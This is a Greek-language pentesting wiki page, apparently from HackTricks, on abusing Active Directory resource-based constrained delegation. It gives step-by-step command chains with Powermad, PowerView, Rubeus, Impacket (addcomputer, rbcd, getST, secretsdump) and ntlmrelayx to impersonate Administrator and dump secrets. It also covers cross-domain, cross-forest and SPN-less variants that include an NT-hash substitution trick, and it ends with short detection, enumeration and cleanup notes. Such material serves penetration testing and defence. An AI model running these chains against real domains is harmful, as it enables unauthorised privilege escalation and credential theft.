# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Βασικά στοιχεία του Resource-based Constrained Delegation

Αυτό είναι παρόμοιο με το βασικό [Constrained Delegation](constrained-delegation.md), αλλά **αντί** να δίνονται δικαιώματα σε ένα **object** ώστε να **impersonate οποιονδήποτε χρήστη σε ένα machine**, το Resource-based Constrain Delegation **ορίζει** στο **object ποιος μπορεί να impersonate οποιονδήποτε χρήστη απέναντί του**.<sup>[[12]](#references)</sup>

Σε αυτήν την περίπτωση, το constrained object θα έχει ένα attribute που ονομάζεται _**msDS-AllowedToActOnBehalfOfOtherIdentity**_, με το όνομα του χρήστη που μπορεί να impersonate οποιονδήποτε άλλο χρήστη απέναντί του.

Μια ακόμη σημαντική διαφορά αυτού του τύπου Constrained Delegation από τους άλλους τύπους delegation είναι ότι οποιοσδήποτε χρήστης με **write permissions σε έναν machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) μπορεί να ορίσει το **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (στους άλλους τύπους Delegation απαιτούνταν domain admin privs).<sup>[[1]](#references)</sup>

### Νέες έννοιες

Στο Constrained Delegation αναφέρθηκε ότι το flag **`TrustedToAuthForDelegation`** μέσα στην τιμή _userAccountControl_ του χρήστη απαιτείται για την εκτέλεση ενός **S4U2Self.** Ωστόσο, αυτό δεν είναι απολύτως αληθές.\
Η πραγματικότητα είναι ότι ακόμη και χωρίς αυτήν την τιμή, μπορείς να εκτελέσεις ένα **S4U2Self** απέναντι σε οποιονδήποτε χρήστη, αν είσαι **service** (έχεις SPN), αλλά, αν **έχεις το `TrustedToAuthForDelegation`**, το TGS που επιστρέφεται θα είναι **Forwardable**, ενώ αν **δεν έχεις** αυτό το flag, το TGS που επιστρέφεται **δεν θα είναι** **Forwardable**.

Ωστόσο, αν το **TGS** που χρησιμοποιείται στο **S4U2Proxy** **δεν είναι Forwardable**, η προσπάθεια abuse ενός **basic Constrain Delegation** **δεν θα λειτουργήσει**. Αν όμως προσπαθείς να εκμεταλλευτείς ένα **Resource-Based constrain delegation**, θα λειτουργήσει.<sup>[[1]](#references)[[2]](#references)</sup>

### Δομή της επίθεσης

> Αν έχεις **write equivalent privileges** σε έναν λογαριασμό **Computer**, μπορείς να αποκτήσεις **privileged access** σε αυτό το machine.

Ας υποθέσουμε ότι ο attacker έχει ήδη **write equivalent privileges στον victim computer**.

1. Ο attacker **compromises** έναν λογαριασμό που έχει **SPN** ή **δημιουργεί έναν** (“Service A”). Σημείωσε ότι οποιοσδήποτε _Admin User_ χωρίς άλλο ειδικό privilege μπορεί να **δημιουργήσει** έως και 10 Computer objects (**_MachineAccountQuota_**) και να τους ορίσει ένα **SPN**. Επομένως, ο attacker μπορεί απλώς να δημιουργήσει ένα Computer object και να του ορίσει ένα SPN.
2. Ο attacker **κάνει abuse του WRITE privilege** του στον victim computer (ServiceB), ώστε να ρυθμίσει το **resource-based constrained delegation** και να επιτρέψει στο ServiceA να impersonate οποιονδήποτε χρήστη απέναντι σε αυτόν τον victim computer (ServiceB).
3. Ο attacker χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από το Service A προς το Service B για έναν χρήστη με **privileged access στο Service B**.
1. S4U2Self (από τον λογαριασμό με το compromised/created SPN): Ζήτησε ένα **TGS του Administrator προς εμένα** (Not Forwardable).
2. S4U2Proxy: Χρησιμοποίησε το **not Forwardable TGS** του προηγούμενου βήματος για να ζητήσεις ένα **TGS** από τον **Administrator** προς το **victim host**.
3. Ακόμη και αν χρησιμοποιείς ένα not Forwardable TGS, επειδή εκμεταλλεύεσαι Resource-based constrained delegation, θα λειτουργήσει.
4. Ο attacker μπορεί να κάνει **pass-the-ticket** και να **impersonate** τον χρήστη, ώστε να αποκτήσει **access στο victim ServiceB**.<sup>[[1]](#references)</sup>

Για να ελέγξεις το _**MachineAccountQuota**_ του domain, μπορείς να χρησιμοποιήσεις:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στον τομέα χρησιμοποιώντας το **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Διαμόρφωση του Resource-based Constrained Delegation

**Χρήση του activedirectory PowerShell module**<sup>[[4]](#references)</sup>
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Χρήση του powerview**<sup>[[3]](#references)</sup>
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Εκτέλεση ενός πλήρους S4U attack (Windows/Rubeus)

Αρχικά, δημιουργήσαμε το νέο αντικείμενο Computer με τον κωδικό πρόσβασης `123456`, επομένως χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Αυτό θα εκτυπώσει τα RC4 και AES hashes για αυτόν τον λογαριασμό.\
Τώρα, μπορεί να πραγματοποιηθεί η επίθεση:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Μπορείτε να δημιουργήσετε περισσότερα tickets για περισσότερα services ζητώντας το μόνο μία φορά, χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Σημειώστε ότι οι users διαθέτουν ένα attribute που ονομάζεται "**Cannot be delegated**". Αν αυτό το attribute ενός user έχει οριστεί σε True, δεν θα μπορείτε να τον impersonate. Αυτή η ιδιότητα μπορεί να εμφανιστεί μέσα στο bloodhound.

### Linux tooling: end-to-end RBCD με Impacket (2024+)

Αν εργάζεστε από Linux, μπορείτε να εκτελέσετε ολόκληρη την αλυσίδα RBCD χρησιμοποιώντας τα official εργαλεία του Impacket:<sup>[[6]](#references)[[7]](#references)</sup>
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Σημειώσεις
- Αν επιβάλλεται LDAP signing/LDAPS, χρησιμοποιήστε `impacket-rbcd -use-ldaps ...`.
- Προτιμήστε AES keys· πολλά σύγχρονα domains περιορίζουν το RC4. Τόσο το Impacket όσο και το Rubeus υποστηρίζουν flows μόνο με AES.
- Το Impacket μπορεί να επανεγγράψει το `sname` ("AnySPN") για ορισμένα tools, αλλά να λαμβάνετε το σωστό SPN όποτε είναι δυνατό (π.χ. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD μεταξύ domains και forests

Αν το **delegating principal** που ελέγχετε βρίσκεται σε **διαφορετικό domain** (ή ακόμη και σε **διαφορετικό forest**) από το **resource computer**, η κατάχρηση εξακολουθεί να είναι **RBCD**, αλλά η ροή ticket δεν είναι πλέον η συνηθισμένη single-domain `S4U2Self -> S4U2Proxy`.

### RBCD μεταξύ domains: ρύθμιση του foreign principal μέσω SID

Όταν ορίζετε το `msDS-AllowedToActOnBehalfOfOtherIdentity` από ένα **διαφορετικό domain**, το foreign machine/user ενδέχεται να **μην μπορεί να επιλυθεί μέσω ονόματος** στο LDAP του target domain. Σε αυτήν την περίπτωση, ρυθμίστε την καταχώριση delegation χρησιμοποιώντας το **SID** του foreign principal αντί για το sAMAccountName/UPN.

Αυτό είναι ιδιαίτερα σημαντικό κατά το relaying NTLM στο LDAP με το `ntlmrelayx.py`:<sup>[[9]](#references)</sup>
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Σημειώσεις:
- Το `--sid` υποδεικνύει στο `ntlmrelayx.py` να χειρίζεται το `--escalate-user` ως SID, κάτι που απαιτείται όταν ο delegating account είναι foreign προς το target domain.
- Ακόμη κι αν το εργαλείο εμφανίσει `User not found in LDAP`, η εγγραφή delegation μπορεί να ολοκληρωθεί επιτυχώς, επειδή το security descriptor αποθηκεύει απευθείας το foreign SID.

### Cross-domain RBCD: cross-realm S4U sequence

Μόλις το foreign principal προστεθεί στο `msDS-AllowedToActOnBehalfOfOtherIdentity`, η λειτουργική cross-domain ροή είναι:<sup>[[9]](#references)[[13]](#references)</sup>

1. Λάβετε ένα **TGT** για τον delegating principal από το δικό του domain.
2. Ζητήστε ένα **referral TGT** για το `krbtgt/<target-domain>`.
3. Ζητήστε ένα **cross-realm S4U2Self referral** για τον impersonated user στον DC του target domain.
4. Ζητήστε το πραγματικό **S4U2Self** ticket για αυτόν τον user πίσω στο delegator domain.
5. Εκτελέστε **S4U2Proxy** στο delegator domain για να λάβετε ένα referral ticket για το target domain.
6. Εκτελέστε το τελικό **S4U2Proxy** στον DC του target domain για να λάβετε το service ticket για `cifs/host.target`, `host/host.target` κ.λπ.

Αυτός είναι ο λόγος για τον οποίο τα stock Linux tooling συχνά αποτυγχάνουν στο cross-domain RBCD:<sup>[[9]](#references)</sup>
- το request **realm** μπορεί να πρέπει να διαφέρει από το realm του TGT που χρησιμοποιείται στο `TGS-REQ`
- η αλυσίδα χρειάζεται **ανεξάρτητα S4U2Proxy βήματα**, όχι μόνο `S4U2Self` ή `S4U2Self` που ακολουθείται αμέσως από ένα μόνο `S4U2Proxy`

### Cross-domain RBCD από Linux

Η Synacktiv δημοσίευσε μια υλοποίηση του Impacket `getST.py`, η οποία αναπαράγει το cross-realm sequence από Linux, διαχειριζόμενη ρητά τα δύο KDC:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
Λειτουργικά, τα νέα arguments είναι:
- `-dc-ip`: DC του **delegating** domain
- `-targetdomain`: domain του **resource computer**
- `-targetdc`: DC του **resource** domain

### Περιορισμοί του Cross-forest RBCD

Το Cross-forest RBCD έχει έναν σημαντικό περιορισμό: **ο impersonated user πρέπει να ανήκει στο ίδιο forest με τον delegating principal**. Με άλλα λόγια, αν το controlled machine account σας βρίσκεται στο `valhalla.local` και το target resource στο `asgard.local`, γενικά **δεν μπορείτε να κάνετε impersonate αυθαίρετους χρήστες του `asgard.local`** σε αυτό το resource μέσω RBCD.<sup>[[9]](#references)</sup>

Παραμένει exploitable όταν:
- ο χρήστης του **delegating forest** είναι **local admin** (ή έχει με άλλο τρόπο privileged δικαιώματα) στο resource host του άλλου forest
- ένα trust επιτρέπει το απαιτούμενο authentication path και το foreign SID γίνεται αποδεκτό στο security descriptor του target computer

### Quirks του Cross-forest RBCD protocol

Το Cross-forest RBCD δεν είναι απλώς "cross-domain με ένα trust". Η παρατηρούμενη ροή περιλαμβάνει δύο quirks που συχνά παραλείπονται από τα κοινά εργαλεία:<sup>[[9]](#references)</sup>

1. Ένα επιπλέον **S4U2Proxy** request που ορίζει `PA-PAC-OPTIONS=branch-aware`
2. Ένα τελικό service ticket που μπορεί να επιστραφεί με χρήση **RC4**, ακόμη και όταν ζητήθηκαν άλλα etypes

Η πρακτική ροή είναι:

1. Αποκτήστε ένα TGT για τον delegating principal στο forest A.
2. Ζητήστε **S4U2Self** για τον impersonated user στο forest A.
3. Ζητήστε **S4U2Proxy** στο forest A για να αποκτήσετε ένα referral TGT για το forest B.
4. Στείλτε ένα δεύτερο **S4U2Proxy** στο forest A **χωρίς το S4U2Self ticket ως additional ticket**, αλλά με ενεργοποιημένο το `branch-aware`, για να αποκτήσετε ένα ακόμη referral TGT για το forest B.
5. Προαιρετικά, ζητήστε ένα κανονικό service ticket στο forest B για τον delegating principal (αυτό το ticket δεν απαιτείται για το τελικό abuse).
6. Χρησιμοποιήστε τα referral tickets από τα βήματα 3 και 4 για να ζητήσετε το τελικό **S4U2Proxy** ticket στο forest B για τον impersonated forest-A user προς το target SPN.

### Cross-forest RBCD από Linux

Το ίδιο Synacktiv Impacket branch προσθέτει ένα `-forest` switch για αυτή τη λογική:<sup>[[9]](#references)[[11]](#references)</sup>
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Recursive multi-domain RBCD (3+ domains)

Σε **multi-domain forests**, τόσο τα **S4U2Self** όσο και τα **S4U2Proxy** μπορούν να είναι **recursive**, αντί να σταματούν μετά από ένα referral:

- **Recursive S4U2Self**: το πρώτο `S4U2Self` αποστέλλεται στο **domain του impersonated user**, τα ενδιάμεσα parent/child hops διασχίζονται με κανονικά `TGS-REQ` referrals για `krbtgt/<REALM>`, και το **τελικό `S4U2Self`** αποστέλλεται στο **domain του delegating principal**.
- Αυτό σημαίνει ότι η **απλή κατοχή ενός TGT** για έναν machine account μπορεί να αρκεί για impersonate ενός **admin από άλλο domain του ίδιου forest** και για request ενός `cifs/host`, `host/host`, `wsman/host` κ.λπ.
- Το **Recursive S4U2Proxy** ακολουθεί την trust chain με τον ίδιο τρόπο: τα ενδιάμεσα hops επαναχρησιμοποιούν το προηγούμενο ticket ως TGT κατά το request του επόμενου `krbtgt/<REALM>` referral, και μόνο το τελευταίο hop επιστρέφει το τελικό service ticket.<sup>[[10]](#references)</sup>

Ένα πρακτικό same-forest παράδειγμα είναι:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Εάν ο **delegating principal είναι user χωρίς SPN**, το τελευταίο recursive `S4U2Self` αποτυγχάνει με **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Το workaround είναι να κάνετε **retry μόνο στο τελικό hop ως `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Σύντομη εκδοχή του abuse chain:

1. Κάντε authenticate με το **NT hash**, ώστε το KDC να κατευθυνθεί προς το **RC4-HMAC (etype 23)**.
2. Κάντε πρώτα request **`-self -u2u`** και κρατήστε αυτό το ticket ξεχωριστά από το μεταγενέστερο proxy step.
3. Κάντε extract το **TGT session key** με το `describeTicket.py`.
4. Αντικαταστήστε το **NT hash** του user με αυτό το **session key**, χρησιμοποιώντας `changepasswd.py -newhashes <session_key>`.
5. Χρησιμοποιήστε ξανά το `S4U2Self+U2U` ticket ως το **`-additional-ticket`** κατά τη διάρκεια ξεχωριστού **`-proxy`** request.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Λειτουργικές επισημάνσεις:

- Όταν το **πρώτο trusted hop είναι ήδη ένα άλλο forest**, προτιμήστε τον αλγόριθμο **branch-aware** (`getST.py ... -forest`) ώστε να ταιριάζει με τη native συμπεριφορά των Windows. Αν το foreign forest προσεγγίζεται μόνο αργότερα στην αλυσίδα, η recursive ροή χωρίς branch awareness μπορεί να λειτουργήσει.<sup>[[9]](#references)</sup>
- Σε πρόσφατους **Windows Server 2022/2025** DCs, η επιβολή RC4 μπορεί να αποτύχει με **`KDC_ERR_ETYPE_NOSUPP`** λόγω της κατάργησης του RC4· αυτό μπορεί να καταστήσει το **SPN-less RBCD αδύνατο**, παρότι το κλασικό SPN-backed RBCD εξακολουθεί να λειτουργεί με AES.<sup>[[15]](#references)</sup>
- Εκτελέστε το **`S4U2Self+U2U` πριν αλλάξετε το hash/τον κωδικό πρόσβασης του χρήστη**: το `SamrChangePasswordUser` **δεν** επανυπολογίζει τα Kerberos AES keys του account, επομένως η αλλαγή κωδικού πρόσβασης πρώτα μπορεί να διακόψει τα επόμενα ticket requests.<sup>[[14]](#references)</sup>
- Το impersonated account πρέπει να παραμένει **delegable**: οι **Protected Users** και τα accounts με **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** αποκλείουν την αλυσίδα.

## Σημειώσεις για detection / hardening

- Τα RBCD paths μεταξύ domains/forests εξακολουθούν συνήθως να δημιουργούνται μέσω **ACL abuse** ή **relay-to-LDAP**. Επιβάλετε **LDAP signing** και **LDAP channel binding** στα DCs για να διακόψετε τα κοινά setup paths.
- Κάντε audit για το ποιοι μπορούν να γράψουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` σε computer objects και επιλύστε τα αποθηκευμένα SIDs, συμπεριλαμβανομένων των **foreign security principals**.
- Σε περιβάλλοντα με πολλά trusts, ελέγξτε το **Selective Authentication**, το **SID filtering** και αν χρήστες από foreign forest διαθέτουν δικαιώματα **local admin** σε resource hosts.

### Πρόσβαση

Η τελευταία command line θα εκτελέσει την **πλήρη επίθεση S4U και θα κάνει inject το TGS** από τον Administrator στον victim host, στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Administrator, επομένως θα μπορείτε να αποκτήσετε πρόσβαση στο **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuse διαφορετικών service tickets

Μάθετε για τα [**διαθέσιμα service tickets εδώ**](silver-ticket.md#available-services).

## Enumeration, auditing και cleanup

### Enumeration υπολογιστών με διαμορφωμένο RBCD

PowerShell (αποκωδικοποίηση του SD για επίλυση των SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read ή flush με μία εντολή):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Εκκαθάριση / επαναφορά RBCD

- PowerShell (εκκαθάριση του attribute):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Σφάλματα Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos έχει ρυθμιστεί ώστε να μην χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το RC4 hash. Παρέχετε στο Rubeus τουλάχιστον το AES256 hash (ή απλώς παρέχετε τα rc4, aes128 και aes256 hashes). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** κατά τη χρήση του `-self` για έναν κανονικό user: το delegating principal πιθανότατα **δεν έχει SPN**. Επαναλάβετε το **last hop** ως **`S4U2Self+U2U`** αντί για ένα κανονικό **`S4U2Self`**.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** κατά τη διάρκεια **SPN-less RBCD**: οι πρόσφατοι DCs ενδέχεται να απορρίπτουν τη forced διαδρομή **RC4-HMAC** που απαιτείται από το τέχνασμα **`S4U2Self+U2U`** + session-key-substitution. Δοκιμάστε μια κλασική διαδρομή **SPN-backed** RBCD με AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος computer διαφέρει από την ώρα του DC και το kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Αυτό σημαίνει ότι το δοσμένο username + hashes δεν λειτουργεί για login. Ίσως ξεχάσατε να βάλετε το "$" μέσα στο username κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
- Ο user που προσπαθείτε να κάνετε impersonate δεν μπορεί να αποκτήσει πρόσβαση στην επιθυμητή υπηρεσία (είτε επειδή δεν μπορείτε να τον κάνετε impersonate είτε επειδή δεν έχει αρκετά privileges)
- Η ζητούμενη υπηρεσία δεν υπάρχει (αν ζητάτε ticket για winrm αλλά το winrm δεν εκτελείται)
- Το fakecomputer που δημιουργήθηκε έχει χάσει τα privileges του πάνω στον vulnerable server και πρέπει να του τα δώσετε ξανά.
- Κάνετε abuse του classic KCD· θυμηθείτε ότι το RBCD λειτουργεί με non-forwardable S4U2Self tickets, ενώ το KCD απαιτεί forwardable.

## Σημειώσεις, relays και alternatives

- Μπορείτε επίσης να γράψετε το RBCD SD μέσω των AD Web Services (ADWS), αν το LDAP έχει φιλτραριστεί. Δείτε:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Οι αλυσίδες Kerberos relay καταλήγουν συχνά σε RBCD για την επίτευξη local SYSTEM σε ένα βήμα. Δείτε πρακτικά end-to-end παραδείγματα:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Αν το LDAP signing/channel binding είναι **απενεργοποιημένο** και μπορείτε να δημιουργήσετε machine account, εργαλεία όπως το **KrbRelayUp** μπορούν να κάνουν relay ένα coerced Kerberos auth προς το LDAP, να ορίσουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` για το machine account σας στο target computer object και να κάνουν αμέσως impersonate τον **Administrator** μέσω S4U από off-host.<sup>[[8]](#references)</sup>

## Αναφορές

- [1] [Wagging the Dog: Κατάχρηση του Resource-Based Constrained Delegation για επίθεση στο Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [2] [Μια ακόμη λέξη για το Delegation](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Ανάληψη ελέγχου Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Κατάχρηση Resource-Based Constrained Delegation](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: Μια Offensive επισκόπηση του Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (official)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Γρήγορο Linux cheatsheet με πρόσφατη σύνταξη](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP signing off → Kerberos relay προς RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Εξερεύνηση cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Εξερεύνηση cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Επισκόπηση Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Εντοπισμός και remediation χρήσης RC4 στο Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
